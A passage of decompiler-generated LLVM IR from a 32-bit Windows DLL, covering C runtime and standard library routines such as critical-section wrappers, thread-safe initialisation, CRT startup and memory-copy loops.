  store i8 %50, i8* %51, align 1, !insn.addr !8014
  %52 = add i32 %stack_var_4.0.reload, 1, !insn.addr !8015
  %53 = add i32 %stack_var_-8.0.reload, 1, !insn.addr !8016
  %54 = add i32 %edi.0.reload, -1, !insn.addr !8017
  %55 = icmp ne i32 %edi.0.reload, 0, !insn.addr !8017
  %56 = zext i1 %55 to i32, !insn.addr !8018
  %57 = add i32 %ebx.0.reload, -1, !insn.addr !8018
  %58 = add i32 %57, %56, !insn.addr !8018
  store i32 %53, i32* %stack_var_-8.1.reg2mem, !insn.addr !8018
  store i32 %52, i32* %stack_var_4.1.reg2mem, !insn.addr !8018
  store i32 %58, i32* %ebx.1.reg2mem, !insn.addr !8018
  store i32 %54, i32* %edi.1.reg2mem, !insn.addr !8018
  br label %dec_label_pc_1000e1ba, !insn.addr !8018

dec_label_pc_1000e1ba:                            ; preds = %dec_label_pc_1000e1a0, %dec_label_pc_1000e156
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %stack_var_4.1.reload = load i32, i32* %stack_var_4.1.reg2mem
  %stack_var_-8.1.reload = load i32, i32* %stack_var_-8.1.reg2mem
  %59 = icmp eq i32 %ebx.1.reload, 0, !insn.addr !8019
  %60 = icmp slt i32 %ebx.1.reload, 0, !insn.addr !8019
  %61 = icmp eq i1 %60, false, !insn.addr !8020
  %62 = icmp eq i1 %59, false, !insn.addr !8020
  %63 = icmp eq i1 %61, %62, !insn.addr !8020
  br i1 %63, label %dec_label_pc_1000e120.backedge, label %dec_label_pc_1000e1c2, !insn.addr !8020

dec_label_pc_1000e120.backedge:                   ; preds = %dec_label_pc_1000e1ba, %dec_label_pc_1000e1c2
  store i32 %stack_var_-8.1.reload, i32* %stack_var_-8.0.reg2mem
  store i32 %stack_var_4.1.reload, i32* %stack_var_4.0.reg2mem
  store i32 %ebx.1.reload, i32* %ebx.0.reg2mem
  store i32 %edi.1.reload, i32* %edi.0.reg2mem
  br label %dec_label_pc_1000e120

dec_label_pc_1000e1c2:                            ; preds = %dec_label_pc_1000e1ba
  %64 = icmp eq i32 %edi.1.reload, 0, !insn.addr !8021
  %65 = or i1 %60, %64
  %66 = icmp eq i1 %65, false
  store i32 %stack_var_-8.1.reload, i32* %ecx.3.reg2mem, !insn.addr !8022
  br i1 %66, label %dec_label_pc_1000e120.backedge, label %dec_label_pc_1000e1d4, !insn.addr !8022

dec_label_pc_1000e1d4:                            ; preds = %dec_label_pc_1000e1c2, %dec_label_pc_1000e188, %dec_label_pc_1000e10e, %dec_label_pc_1000e0ef
  %ecx.3.reload = load i32, i32* %ecx.3.reg2mem
  ret i32 %ecx.3.reload, !insn.addr !8023
}

define i32 @function_1000e1dd(i32 %arg1, i32 %arg2, i32 %arg3) {
dec_label_pc_1000e1dd:
  %ecx.1.reg2mem = alloca i32, !insn.addr !8024
  %edi.1.reg2mem = alloca i32, !insn.addr !8024
  %esp.1.reg2mem = alloca i32, !insn.addr !8024
  %ebx.1.reg2mem = alloca i32, !insn.addr !8024
  %stack_var_4.1.reg2mem = alloca i32, !insn.addr !8024
  %stack_var_-12.1.reg2mem = alloca i32, !insn.addr !8024
  %esi.1.reg2mem = alloca i32, !insn.addr !8024
  %stack_var_-20.0.reg2mem = alloca i32, !insn.addr !8024
  %storemerge9.reg2mem = alloca i32, !insn.addr !8024
  %.reg2mem = alloca i32, !insn.addr !8024
  %edi.0.reg2mem = alloca i32, !insn.addr !8024
  %esp.0.reg2mem = alloca i32, !insn.addr !8024
  %ebx.0.reg2mem = alloca i32, !insn.addr !8024
  %stack_var_4.0.reg2mem = alloca i32, !insn.addr !8024
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !8024
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-32 = alloca i32, align 4
  %1 = icmp slt i32 %arg3, 0, !insn.addr !8025
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !8026
  br i1 %1, label %dec_label_pc_1000e2be, label %dec_label_pc_1000e1ff, !insn.addr !8026

dec_label_pc_1000e1ff:                            ; preds = %dec_label_pc_1000e1dd
  %2 = icmp eq i32 %arg3, 0, !insn.addr !8025
  %3 = icmp eq i1 %2, false, !insn.addr !8027
  %4 = icmp ne i1 %3, true, !insn.addr !8027
  %5 = icmp eq i32 %arg2, 0, !insn.addr !8028
  %or.cond = icmp eq i1 %5, %4
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !8027
  br i1 %or.cond, label %dec_label_pc_1000e2be, label %dec_label_pc_1000e20d.preheader, !insn.addr !8027

dec_label_pc_1000e20d.preheader:                  ; preds = %dec_label_pc_1000e1ff
  %6 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !8029
  %7 = add i32 %0, 32, !insn.addr !8030
  %8 = inttoptr i32 %7 to i32*, !insn.addr !8030
  %9 = add i32 %0, 48
  %10 = inttoptr i32 %9 to i32*
  store i32 0, i32* %stack_var_-12.0.reg2mem
  store i32 %arg1, i32* %stack_var_4.0.reg2mem
  store i32 %arg3, i32* %ebx.0.reg2mem
  store i32 %6, i32* %esp.0.reg2mem
  store i32 %arg2, i32* %edi.0.reg2mem
  br label %dec_label_pc_1000e20d

dec_label_pc_1000e20d:                            ; preds = %dec_label_pc_1000e20d.backedge, %dec_label_pc_1000e20d.preheader
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %stack_var_4.0.reload = load i32, i32* %stack_var_4.0.reg2mem
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  %11 = load i32, i32* %8, align 4, !insn.addr !8030
  %12 = inttoptr i32 %11 to i32*, !insn.addr !8031
  %13 = load i32, i32* %12, align 4, !insn.addr !8031
  %14 = icmp eq i32 %13, 0, !insn.addr !8032
  store i32 0, i32* %.reg2mem, !insn.addr !8033
  store i32 0, i32* %storemerge9.reg2mem, !insn.addr !8033
  br i1 %14, label %dec_label_pc_1000e22b, label %dec_label_pc_1000e21f, !insn.addr !8033

dec_label_pc_1000e21f:                            ; preds = %dec_label_pc_1000e20d
  %15 = load i32, i32* %10, align 4, !insn.addr !8034
  %16 = inttoptr i32 %15 to i32*, !insn.addr !8035
  %17 = load i32, i32* %16, align 4, !insn.addr !8035
  %18 = ashr i32 %17, 31, !insn.addr !8036
  %19 = icmp slt i32 %17, 0, !insn.addr !8037
  store i32 %18, i32* %.reg2mem, !insn.addr !8038
  store i32 %17, i32* %storemerge9.reg2mem, !insn.addr !8038
  br i1 %19, label %dec_label_pc_1000e271, label %dec_label_pc_1000e22b, !insn.addr !8038

dec_label_pc_1000e22b:                            ; preds = %dec_label_pc_1000e20d, %dec_label_pc_1000e21f
  %storemerge9.reload = load i32, i32* %storemerge9.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %20 = icmp eq i32 %.reload, 0, !insn.addr !8037
  %21 = icmp eq i1 %20, false, !insn.addr !8039
  %22 = icmp ne i1 %21, true, !insn.addr !8039
  %23 = icmp eq i32 %storemerge9.reload, 0, !insn.addr !8040
  %or.cond3 = icmp eq i1 %23, %22
  br i1 %or.cond3, label %dec_label_pc_1000e271, label %dec_label_pc_1000e231, !insn.addr !8039

dec_label_pc_1000e231:                            ; preds = %dec_label_pc_1000e22b
  %24 = icmp sgt i32 %ebx.0.reload, %.reload, !insn.addr !8041
  store i32 %.reload, i32* %stack_var_-20.0.reg2mem, !insn.addr !8041
  store i32 %storemerge9.reload, i32* %esi.1.reg2mem, !insn.addr !8041
  br i1 %24, label %dec_label_pc_1000e240, label %dec_label_pc_1000e235, !insn.addr !8041

dec_label_pc_1000e235:                            ; preds = %dec_label_pc_1000e231
  %25 = icmp sge i32 %ebx.0.reload, %.reload, !insn.addr !8042
  %26 = icmp ult i32 %edi.0.reload, %storemerge9.reload, !insn.addr !8043
  %27 = icmp eq i1 %26, false, !insn.addr !8044
  %or.cond5 = icmp eq i1 %25, %27
  %spec.select = select i1 %or.cond5, i32 %.reload, i32 %ebx.0.reload
  %spec.select8 = select i1 %or.cond5, i32 %storemerge9.reload, i32 %edi.0.reload
  store i32 %spec.select, i32* %stack_var_-20.0.reg2mem
  store i32 %spec.select8, i32* %esi.1.reg2mem
  br label %dec_label_pc_1000e240

dec_label_pc_1000e240:                            ; preds = %dec_label_pc_1000e235, %dec_label_pc_1000e231
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %stack_var_-20.0.reload = load i32, i32* %stack_var_-20.0.reg2mem
  %28 = add i32 %esp.0.reload, -4, !insn.addr !8045
  %29 = inttoptr i32 %28 to i32*, !insn.addr !8045
  store i32 %esi.1.reload, i32* %29, align 4, !insn.addr !8045
  %30 = add i32 %esp.0.reload, -8, !insn.addr !8046
  %31 = inttoptr i32 %30 to i32*, !insn.addr !8046
  store i32 %stack_var_4.0.reload, i32* %31, align 4, !insn.addr !8046
  %32 = add i32 %esp.0.reload, -12, !insn.addr !8047
  %33 = inttoptr i32 %32 to i32*, !insn.addr !8047
  store i32 %13, i32* %33, align 4, !insn.addr !8047
  %34 = call i32 @_memcpy.12(), !insn.addr !8048
  %35 = add i32 %esi.1.reload, %stack_var_4.0.reload, !insn.addr !8049
  %36 = add i32 %esi.1.reload, %stack_var_-12.0.reload, !insn.addr !8050
  %37 = sub i32 %edi.0.reload, %esi.1.reload, !insn.addr !8051
  %38 = icmp ult i32 %edi.0.reload, %esi.1.reload, !insn.addr !8051
  %39 = load i32, i32* %10, align 4, !insn.addr !8052
  %.neg = sext i1 %38 to i32
  %.neg10 = sub i32 %ebx.0.reload, %stack_var_-20.0.reload, !insn.addr !8053
  %40 = add i32 %.neg10, %.neg, !insn.addr !8053
  %41 = inttoptr i32 %39 to i32*, !insn.addr !8054
  %42 = load i32, i32* %41, align 4, !insn.addr !8054
  %43 = sub i32 %42, %esi.1.reload, !insn.addr !8054
  store i32 %43, i32* %41, align 4, !insn.addr !8054
  %44 = load i32, i32* %8, align 4, !insn.addr !8055
  %45 = inttoptr i32 %44 to i32*, !insn.addr !8056
  %46 = load i32, i32* %45, align 4, !insn.addr !8056
  %47 = add i32 %46, %esi.1.reload, !insn.addr !8056
  store i32 %47, i32* %45, align 4, !insn.addr !8056
  store i32 %36, i32* %stack_var_-12.1.reg2mem, !insn.addr !8057
  store i32 %35, i32* %stack_var_4.1.reg2mem, !insn.addr !8057
  store i32 %40, i32* %ebx.1.reg2mem, !insn.addr !8057
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !8057
  store i32 %37, i32* %edi.1.reg2mem, !insn.addr !8057
  br label %dec_label_pc_1000e2a2, !insn.addr !8057

dec_label_pc_1000e271:                            ; preds = %dec_label_pc_1000e22b, %dec_label_pc_1000e21f
  %48 = inttoptr i32 %stack_var_4.0.reload to i8*, !insn.addr !8058
  %49 = load i8, i8* %48, align 1, !insn.addr !8058
  %50 = zext i8 %49 to i32, !insn.addr !8058
  %51 = add i32 %esp.0.reload, -4, !insn.addr !8059
  %52 = inttoptr i32 %51 to i32*, !insn.addr !8059
  store i32 %50, i32* %52, align 4, !insn.addr !8059
  %53 = call i32 @"@_guard_check_icall@4"(), !insn.addr !8060
  %54 = icmp eq i32 %53, -1, !insn.addr !8061
  store i32 %stack_var_-12.0.reload, i32* %ecx.1.reg2mem, !insn.addr !8062
  br i1 %54, label %dec_label_pc_1000e2be, label %dec_label_pc_1000e291, !insn.addr !8062

dec_label_pc_1000e291:                            ; preds = %dec_label_pc_1000e271
  %55 = add i32 %stack_var_4.0.reload, 1, !insn.addr !8063
  %56 = add i32 %stack_var_-12.0.reload, 1, !insn.addr !8064
  %57 = add i32 %edi.0.reload, -1, !insn.addr !8065
  %58 = icmp ne i32 %edi.0.reload, 0, !insn.addr !8065
  %59 = zext i1 %58 to i32, !insn.addr !8066
  %60 = add i32 %ebx.0.reload, -1, !insn.addr !8066
  %61 = add i32 %60, %59, !insn.addr !8066
  store i32 %56, i32* %stack_var_-12.1.reg2mem, !insn.addr !8066
  store i32 %55, i32* %stack_var_4.1.reg2mem, !insn.addr !8066
  store i32 %61, i32* %ebx.1.reg2mem, !insn.addr !8066
  store i32 %51, i32* %esp.1.reg2mem, !insn.addr !8066
  store i32 %57, i32* %edi.1.reg2mem, !insn.addr !8066
  br label %dec_label_pc_1000e2a2, !insn.addr !8066

dec_label_pc_1000e2a2:                            ; preds = %dec_label_pc_1000e291, %dec_label_pc_1000e240
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %stack_var_4.1.reload = load i32, i32* %stack_var_4.1.reg2mem
  %stack_var_-12.1.reload = load i32, i32* %stack_var_-12.1.reg2mem
  %62 = icmp eq i32 %ebx.1.reload, 0, !insn.addr !8067
  %63 = icmp slt i32 %ebx.1.reload, 0, !insn.addr !8067
  %64 = icmp eq i1 %63, false, !insn.addr !8068
  %65 = icmp eq i1 %62, false, !insn.addr !8068
  %66 = icmp eq i1 %64, %65, !insn.addr !8068
  br i1 %66, label %dec_label_pc_1000e20d.backedge, label %dec_label_pc_1000e2ad, !insn.addr !8068

dec_label_pc_1000e20d.backedge:                   ; preds = %dec_label_pc_1000e2a2, %dec_label_pc_1000e2ad
  store i32 %stack_var_-12.1.reload, i32* %stack_var_-12.0.reg2mem
  store i32 %stack_var_4.1.reload, i32* %stack_var_4.0.reg2mem
  store i32 %ebx.1.reload, i32* %ebx.0.reg2mem
  store i32 %esp.1.reload, i32* %esp.0.reg2mem
  store i32 %edi.1.reload, i32* %edi.0.reg2mem
  br label %dec_label_pc_1000e20d

dec_label_pc_1000e2ad:                            ; preds = %dec_label_pc_1000e2a2
  %67 = icmp eq i32 %edi.1.reload, 0, !insn.addr !8069
  %68 = or i1 %63, %67
  %69 = icmp eq i1 %68, false
  store i32 %stack_var_-12.1.reload, i32* %ecx.1.reg2mem, !insn.addr !8070
  br i1 %69, label %dec_label_pc_1000e20d.backedge, label %dec_label_pc_1000e2be, !insn.addr !8070

dec_label_pc_1000e2be:                            ; preds = %dec_label_pc_1000e2ad, %dec_label_pc_1000e271, %dec_label_pc_1000e1ff, %dec_label_pc_1000e1dd
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  ret i32 %ecx.1.reload, !insn.addr !8071
}

declare i32 @_memcpy_s(i32*, i32, i32*, i32) local_unnamed_addr

declare i32 @"??1_Fac_tidy_reg_t@std@@QAE@XZ"() local_unnamed_addr

declare i32 @"?_Facet_Register@std@@YAXPAV_Facet_base@1@@Z"(i32*) local_unnamed_addr

define i32 @function_1000e50f() local_unnamed_addr {
dec_label_pc_1000e50f:
  %0 = load i32, i32* @global_var_1003e044, align 4, !insn.addr !8072
  ret i32 %0, !insn.addr !8073
}

declare i32 @"?_Locinfo_ctor@_Locinfo@std@@SAXPAV12@PBD@Z"(i32*, i8*) local_unnamed_addr

declare i32 @"?_Locinfo_dtor@_Locinfo@std@@SAXPAV12@@Z"(i32*) local_unnamed_addr

define i32 @function_1000e737() local_unnamed_addr {
dec_label_pc_1000e737:
  %0 = call i32 @function_10011f82(), !insn.addr !8074
  ret i32 %0, !insn.addr !8074
}

declare i32 @"??_G__non_rtti_object@std@@UAEPAXI@Z"(i32)

declare i32 @"?_Xbad_alloc@std@@YAXXZ"() local_unnamed_addr

declare i32 @"?_Xinvalid_argument@std@@YAXPBD@Z"(i8*) local_unnamed_addr

declare i32 @"?_Xinvalid_argument@std@@YAXPBD@Z.8"(i8*) local_unnamed_addr

declare i32 @"?_Syserror_map@std@@YAPBDH@Z"(i32) local_unnamed_addr

declare i32 @__Getctype(i32*) local_unnamed_addr

declare i32 @__Tolower() local_unnamed_addr

declare i32 @__Getcvt(i32*) local_unnamed_addr

declare i32 @__Toupper() local_unnamed_addr

define i32 @__Mtxdst(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000eb7d:
  %0 = inttoptr i32 %arg1 to %_RTL_CRITICAL_SECTION*, !insn.addr !8075
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %0), !insn.addr !8075
  ret i32 ptrtoint (i32* @1 to i32), !insn.addr !8076
}

define i32 @__Mtxlock(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000eba2:
  %0 = inttoptr i32 %arg1 to %_RTL_CRITICAL_SECTION*, !insn.addr !8077
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %0), !insn.addr !8077
  ret i32 ptrtoint (i32* @1 to i32), !insn.addr !8078
}

define i32 @__Mtxunlock(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000ebb0:
  %0 = inttoptr i32 %arg1 to %_RTL_CRITICAL_SECTION*, !insn.addr !8079
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %0), !insn.addr !8079
  ret i32 ptrtoint (i32* @1 to i32), !insn.addr !8080
}

declare i32 @"??1_Init_atexit@@QAE@XZ"() local_unnamed_addr

declare i32 @"@__security_check_cookie@4"() local_unnamed_addr

define i32 @function_1000f4b1() local_unnamed_addr {
dec_label_pc_1000f4b1:
  call void @_free(i32* nonnull @1), !insn.addr !8081
  ret i32 ptrtoint (i32* @1 to i32), !insn.addr !8081
}

define i32 @function_1000f4b6() local_unnamed_addr {
dec_label_pc_1000f4b6:
  %0 = call i32 @function_1000f4fa(), !insn.addr !8082
  %1 = call i32 @function_1000fbac(i32 0), !insn.addr !8083
  %2 = trunc i32 %1 to i8, !insn.addr !8084
  %3 = icmp eq i8 %2, 0, !insn.addr !8084
  br i1 %3, label %dec_label_pc_1000f4d5, label %dec_label_pc_1000f4c7, !insn.addr !8085

dec_label_pc_1000f4c7:                            ; preds = %dec_label_pc_1000f4b6
  %4 = call i32 @_atexit(void ()* inttoptr (i32 268498362 to void ()*)), !insn.addr !8086
  ret i32 0, !insn.addr !8087

dec_label_pc_1000f4d5:                            ; preds = %dec_label_pc_1000f4b6
  %5 = call i32 @___scrt_fastfail(), !insn.addr !8088
  %6 = call i32 @__asm_int3(), !insn.addr !8089
  ret i32 %6, !insn.addr !8089
}

declare i32 @"??$__crt_fast_encode_pointer@P6AXXZ@@YAP6AXXZQ6AXXZ@Z"(void ()*) local_unnamed_addr

define i32 @function_1000f4fa() local_unnamed_addr {
dec_label_pc_1000f4fa:
  %esp.1.reg2mem = alloca i32, !insn.addr !8090
  %eax.0.reg2mem = alloca i32, !insn.addr !8090
  %esi.0.in.reg2mem = alloca i32*, !insn.addr !8090
  %esp.0.reg2mem = alloca i32, !insn.addr !8090
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-20 = alloca i16*, align 4
  %stack_var_-16 = alloca i16*, align 4
  store i16* inttoptr (i32 4000 to i16*), i16** %stack_var_-20, align 4, !insn.addr !8091
  %3 = call i32 @___vcrt_InitializeCriticalSectionEx(i32* bitcast (%_RTL_CRITICAL_SECTION** @global_var_1003e208 to i32*), i32 4000, i32 0, i32 %0, i32 %1, i32 %2), !insn.addr !8092
  store i16* getelementptr inbounds ([33 x i16], [33 x i16]* @global_var_10030500, i32 0, i32 0), i16** %stack_var_-16, align 4, !insn.addr !8093
  %4 = ptrtoint i16** %stack_var_-16 to i32, !insn.addr !8093
  %5 = call i32* @GetModuleHandleW(i16* getelementptr inbounds ([33 x i16], [33 x i16]* @global_var_10030500, i32 0, i32 0)), !insn.addr !8094
  %6 = icmp eq i32* %5, null, !insn.addr !8095
  %7 = icmp eq i1 %6, false, !insn.addr !8096
  store i32 %4, i32* %esp.0.reg2mem, !insn.addr !8096
  store i32* %5, i32** %esi.0.in.reg2mem, !insn.addr !8096
  br i1 %7, label %dec_label_pc_1000f533, label %dec_label_pc_1000f522, !insn.addr !8096

dec_label_pc_1000f522:                            ; preds = %dec_label_pc_1000f4fa
  store i16* getelementptr inbounds ([13 x i16], [13 x i16]* @global_var_1002e00c, i32 0, i32 0), i16** %stack_var_-20, align 4, !insn.addr !8097
  %8 = ptrtoint i16** %stack_var_-20 to i32, !insn.addr !8097
  %9 = call i32* @GetModuleHandleW(i16* getelementptr inbounds ([13 x i16], [13 x i16]* @global_var_1002e00c, i32 0, i32 0)), !insn.addr !8098
  %10 = icmp eq i32* %9, null, !insn.addr !8099
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !8100
  store i32* %9, i32** %esi.0.in.reg2mem, !insn.addr !8100
  store i32 %8, i32* %esp.1.reg2mem, !insn.addr !8100
  br i1 %10, label %dec_label_pc_1000f5b2, label %dec_label_pc_1000f533, !insn.addr !8100

dec_label_pc_1000f533:                            ; preds = %dec_label_pc_1000f522, %dec_label_pc_1000f4fa
  %esi.0.in.reload = load i32*, i32** %esi.0.in.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %esi.0 = ptrtoint i32* %esi.0.in.reload to i32
  %11 = add i32 %esp.0.reload, -4, !insn.addr !8101
  %12 = inttoptr i32 %11 to i32*, !insn.addr !8101
  store i32 ptrtoint ([28 x i8]* @global_var_1002e24c to i32), i32* %12, align 4, !insn.addr !8101
  %13 = add i32 %esp.0.reload, -8, !insn.addr !8102
  %14 = inttoptr i32 %13 to i32*, !insn.addr !8102
  store i32 %esi.0, i32* %14, align 4, !insn.addr !8102
  %15 = call i32 ()* @GetProcAddress(i32* nonnull @1, i8* bitcast (i32* @1 to i8*)), !insn.addr !8103
  %16 = add i32 %esp.0.reload, -12, !insn.addr !8104
  %17 = inttoptr i32 %16 to i32*, !insn.addr !8104
  store i32 ptrtoint ([25 x i8]* @global_var_1002e29c to i32), i32* %17, align 4, !insn.addr !8104
  %18 = add i32 %esp.0.reload, -16, !insn.addr !8105
  %19 = inttoptr i32 %18 to i32*, !insn.addr !8105
  store i32 %esi.0, i32* %19, align 4, !insn.addr !8105
  %20 = call i32 ()* @GetProcAddress(i32* nonnull @1, i8* bitcast (i32* @1 to i8*)), !insn.addr !8106
  %21 = add i32 %esp.0.reload, -20, !insn.addr !8107
  %22 = inttoptr i32 %21 to i32*, !insn.addr !8107
  store i32 ptrtoint ([25 x i8]* @global_var_1002e280 to i32), i32* %22, align 4, !insn.addr !8107
  %23 = add i32 %esp.0.reload, -24, !insn.addr !8108
  %24 = inttoptr i32 %23 to i32*, !insn.addr !8108
  store i32 %esi.0, i32* %24, align 4, !insn.addr !8108
  %25 = call i32 ()* @GetProcAddress(i32* nonnull @1, i8* bitcast (i32* @1 to i8*)), !insn.addr !8109
  %26 = icmp eq i32 ()* %15, null, !insn.addr !8110
  %27 = icmp eq i32 ()* %20, null, !insn.addr !8111
  %or.cond = or i1 %26, %27
  %28 = icmp eq i32 ()* %25, null, !insn.addr !8112
  %or.cond6 = or i1 %or.cond, %28
  br i1 %or.cond6, label %dec_label_pc_1000f598, label %dec_label_pc_1000f569, !insn.addr !8113

dec_label_pc_1000f569:                            ; preds = %dec_label_pc_1000f533
  %29 = ptrtoint i32 ()* %25 to i32, !insn.addr !8109
  %30 = ptrtoint i32 ()* %20 to i32, !insn.addr !8106
  store i32 0, i32* @global_var_1003e224, align 4, !insn.addr !8114
  %31 = add i32 %esp.0.reload, -28, !insn.addr !8115
  %32 = inttoptr i32 %31 to i32*, !insn.addr !8115
  store i32 ptrtoint (i32* @global_var_1003e220 to i32), i32* %32, align 4, !insn.addr !8115
  %33 = call i32 @"@_guard_check_icall@4"(), !insn.addr !8116
  %34 = add i32 %esp.0.reload, -32, !insn.addr !8117
  %35 = inttoptr i32 %34 to i32*, !insn.addr !8117
  store i32 %30, i32* %35, align 4, !insn.addr !8117
  %36 = call i32 @"??$__crt_fast_encode_pointer@P6AXXZ@@YAP6AXXZQ6AXXZ@Z"(void ()* bitcast (i32* @1 to void ()*)), !insn.addr !8118
  %37 = add i32 %esp.0.reload, -36, !insn.addr !8119
  %38 = inttoptr i32 %37 to i32*, !insn.addr !8119
  store i32 %29, i32* %38, align 4, !insn.addr !8119
  store i32 %36, i32* @global_var_1003e228, align 4, !insn.addr !8120
  %39 = call i32 @"??$__crt_fast_encode_pointer@P6AXXZ@@YAP6AXXZQ6AXXZ@Z"(void ()* bitcast (i32* @1 to void ()*)), !insn.addr !8121
  store i32 %39, i32* @global_var_1003e22c, align 4, !insn.addr !8122
  store i32 %39, i32* %eax.0.reg2mem, !insn.addr !8123
  br label %dec_label_pc_1000f5ae, !insn.addr !8123

dec_label_pc_1000f598:                            ; preds = %dec_label_pc_1000f533
  %40 = add i32 %esp.0.reload, -28, !insn.addr !8124
  %41 = inttoptr i32 %40 to i32*, !insn.addr !8124
  store i32 0, i32* %41, align 4, !insn.addr !8124
  %42 = add i32 %esp.0.reload, -32, !insn.addr !8125
  %43 = inttoptr i32 %42 to i32*, !insn.addr !8125
  store i32 0, i32* %43, align 4, !insn.addr !8125
  %44 = add i32 %esp.0.reload, -36, !insn.addr !8126
  %45 = inttoptr i32 %44 to i32*, !insn.addr !8126
  store i32 1, i32* %45, align 4, !insn.addr !8126
  %46 = add i32 %esp.0.reload, -40, !insn.addr !8127
  %47 = inttoptr i32 %46 to i32*, !insn.addr !8127
  store i32 0, i32* %47, align 4, !insn.addr !8127
  %48 = call i32* @CreateEventW(%_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i1 ptrtoint (i32* @1 to i1), i1 ptrtoint (i32* @1 to i1), i16* bitcast (i32* @1 to i16*)), !insn.addr !8128
  %49 = ptrtoint i32* %48 to i32, !insn.addr !8128
  store i32 %49, i32* @global_var_1003e224, align 4, !insn.addr !8129
  %50 = icmp eq i32* %48, null, !insn.addr !8130
  store i32 %49, i32* %eax.0.reg2mem, !insn.addr !8131
  store i32 %46, i32* %esp.1.reg2mem, !insn.addr !8131
  br i1 %50, label %dec_label_pc_1000f5b2, label %dec_label_pc_1000f5ae, !insn.addr !8131

dec_label_pc_1000f5ae:                            ; preds = %dec_label_pc_1000f598, %dec_label_pc_1000f569
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !8132

dec_label_pc_1000f5b2:                            ; preds = %dec_label_pc_1000f598, %dec_label_pc_1000f522
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %51 = add i32 %esp.1.reload, -4, !insn.addr !8133
  %52 = inttoptr i32 %51 to i32*, !insn.addr !8133
  store i32 7, i32* %52, align 4, !insn.addr !8133
  %53 = call i32 @___scrt_fastfail(), !insn.addr !8134
  %54 = call i32 @__asm_int3(), !insn.addr !8135
  ret i32 %54, !insn.addr !8135
}

declare i32 @__Init_thread_footer(i32*) local_unnamed_addr

declare i32 @__Init_thread_header(i32*) local_unnamed_addr

define void @__Init_thread_lock(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_1000f65b:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !8136
  ret void, !insn.addr !8137
}

define void @__Init_thread_unlock(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_1000f6a8:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !8138
  ret void, !insn.addr !8139
}

define i32 @___report_rangecheckfailure() local_unnamed_addr {
dec_label_pc_1000f83c:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @___report_securityfailure(i32 8, i32 %0), !insn.addr !8140
  ret i32 %1, !insn.addr !8141
}

declare i32 @___report_securityfailure(i32, i32) local_unnamed_addr

declare i32 @"??2@YAPAXI@Z"(i32) local_unnamed_addr

declare i32 @"??_M@YGXPAXIIP6EX0@Z@Z"(i32*, i32, i32, void (i32*)*) local_unnamed_addr

define i32 @function_1000f9b5() local_unnamed_addr {
dec_label_pc_1000f9b5:
  %eax.0.reg2mem = alloca i32, !insn.addr !8142
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %4 = call i32 @__decompiler_undefined_function_1()
  %5 = trunc i32 %4 to i8, !insn.addr !8142
  %6 = icmp eq i8 %5, 0, !insn.addr !8142
  %7 = icmp eq i1 %6, false, !insn.addr !8143
  br i1 %7, label %dec_label_pc_1000f9c4, label %dec_label_pc_1000f9b9, !insn.addr !8143

dec_label_pc_1000f9b9:                            ; preds = %dec_label_pc_1000f9b5
  %8 = add i32 %2, 20, !insn.addr !8144
  %9 = inttoptr i32 %8 to i32*, !insn.addr !8144
  %10 = load i32, i32* %9, align 4, !insn.addr !8144
  %11 = inttoptr i32 %10 to void (i32*)*, !insn.addr !8144
  %12 = inttoptr i32 %1 to i32*, !insn.addr !8145
  %13 = call i32 @"?__ArrayUnwind@@YGXPAXIIP6EX0@Z@Z"(i32* %12, i32 %3, i32 %0, void (i32*)* %11), !insn.addr !8145
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !8145
  br label %dec_label_pc_1000f9c4, !insn.addr !8145

dec_label_pc_1000f9c4:                            ; preds = %dec_label_pc_1000f9b9, %dec_label_pc_1000f9b5
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !8146
}

declare i32 @"?__ArrayUnwind@@YGXPAXIIP6EX0@Z@Z"(i32*, i32, i32, void (i32*)*) local_unnamed_addr

declare i32 @___scrt_acquire_startup_lock() local_unnamed_addr

define i32 @function_1000faab() local_unnamed_addr {
dec_label_pc_1000faab:
  %storemerge.reg2mem = alloca i32, !insn.addr !8147
